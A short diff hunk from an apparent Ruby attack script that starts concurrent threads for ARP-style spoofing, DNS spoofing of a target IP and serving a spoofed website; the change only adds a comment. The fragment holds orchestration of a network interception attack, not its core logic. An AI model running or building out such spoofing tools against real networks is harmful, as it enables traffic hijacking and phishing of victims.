@@ -155,7 +155,7 @@ begin
   puts "Starting the DNS spoofing thread..."
   dns_thread = Thread.new{spoof_dns(target_ip)}
   puts "Starting the spoofed website thread..."
-  web_thread = Thread.new{`ruby site.rb`}
+  web_thread = Thread.new{`ruby site.rb`} #probably a better way to run this in the code, but good enough
   spoof_thread.join
   dns_thread.join
   web_thread.join
